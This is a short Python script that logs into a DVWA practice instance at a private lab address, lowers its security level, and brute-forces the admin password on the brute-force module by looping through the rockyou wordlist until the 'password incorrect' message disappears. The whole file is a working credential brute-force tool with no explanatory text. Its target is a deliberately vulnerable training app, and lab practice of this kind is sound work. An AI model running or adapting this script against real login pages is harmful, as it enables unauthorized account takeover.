#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

s = requests.Session()

def dvwa_login():
    url = "http://192.168.210.130/dvwa/login.php"
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url,params)
    html = r.text
    soup = BeautifulSoup(html,'lxml')
    print("[+] Logged in the DVWA.")
dvwa_login()

def security_low():
    security_url = "http://192.168.210.130/dvwa/security.php"
    security_params = {'security':'low','seclev_submit':'Submit'}
    r2 = s.post(security_url,security_params)
    html2 = r2.text
    soup2 = BeautifulSoup(html2,'lxml')
    print("[+] Security set to Low.")
security_low()

def brute_low():
    print("[+] Starting Brute Force...")
    brute_easy_url = "http://192.168.210.130/dvwa/vulnerabilities/brute/?username=admin&password=admin&Login=Login#"
    with open('/usr/share/wordlists/rockyou.txt','r') as wordlist:
        for words in wordlist:
            passwd = words.strip()
            brute_url = 'http://192.168.210.130/dvwa/vulnerabilities/brute/'
            brute_params = {'username':'admin','password':passwd,'Login':'Login#'}
            r3 = s.get(brute_url, params= brute_params)
            html3 = r3.text
            soup3 = BeautifulSoup(html3,'lxml')
            text = soup3.get_text()
            if "password incorrect" not in text:
                    print("[~] Password found: "+ passwd)
                    break
brute_low()    

